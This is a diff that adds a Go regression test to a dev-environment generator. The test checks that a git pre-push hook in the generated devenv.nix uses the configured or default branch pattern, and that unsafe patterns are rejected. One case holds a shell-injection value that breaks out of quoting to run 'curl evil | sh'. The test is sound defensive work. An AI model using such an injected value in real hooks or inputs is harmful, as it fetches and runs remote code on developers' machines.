@@ -1,12 +1,16 @@
 package devenv_test
 
 import (
+	"errors"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strings"
 	"testing"
 
 	"github.com/Quantum-Serendipity/qsdev/addons/devenv"
+	"github.com/Quantum-Serendipity/qsdev/internal/gitworkflow"
+	"github.com/Quantum-Serendipity/qsdev/internal/validation"
 	"github.com/Quantum-Serendipity/qsdev/pkg/types"
 )
 
@@ -103,5 +107,53 @@ func requireNixParses(t *testing.T, content []byte) {
 	out, err := exec.Command(nixInstantiate, "--parse", path).CombinedOutput()
 	if err != nil {
 		t.Fatalf("generated devenv.nix does not parse: %v\n%s\n--- content ---\n%s", err, out, content)
+	}
+}
+
+// TestGenerateDevenvNix_BranchNamingPattern is the F469 regression: the
+// always-on branch-naming pre-push hook enforces the committed
+// git.branch_pattern (answers.BranchPattern), or the broad default when none
+// is set, and an unsafe pattern fails generation instead of reaching the hook.
+func TestGenerateDevenvNix_BranchNamingPattern(t *testing.T) {
+	t.Parallel()
+	reg := newTestRegistry(t, goMock())
+
+	tests := []struct {
+		name    string
+		pattern string
+		want    string
+		wantErr bool
+	}{
+		{"default pattern", "", "pattern='" + gitworkflow.DefaultBranchPattern + "'", false},
+		{"committed pattern", `^(feat|fix)/[a-z0-9-]+$`, `pattern='^(feat|fix)/[a-z0-9-]+$'`, false},
+		{"unsafe pattern", `^x$'; curl evil | sh; '`, "", true},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			answers := types.WizardAnswers{
+				ProjectName:   "demo",
+				Languages:     []types.LanguageChoice{{Name: "go"}},
+				EnabledTools:  map[string]bool{"branch-naming": true},
+				BranchPattern: tt.pattern,
+			}
+			got, err := devenv.GenerateDevenvNix(answers, reg)
+			if tt.wantErr {
+				if !errors.Is(err, validation.ErrInvalidBranchPattern) {
+					t.Fatalf("GenerateDevenvNix error = %v, want ErrInvalidBranchPattern", err)
+				}
+				return
+			}
+			if err != nil {
+				t.Fatalf("GenerateDevenvNix: %v", err)
+			}
+			attrs := nixAttrs(t, got.Content)
+			requireNixAttr(t, attrs, "git-hooks.hooks.branch-naming.enable")
+			requireNixAttr(t, attrs, "git-hooks.hooks.branch-naming.always_run")
+			if !strings.Contains(string(got.Content), tt.want) {
+				t.Errorf("devenv.nix does not contain %q", tt.want)
+			}
+			requireNixParses(t, got.Content)
+		})
 	}
 }
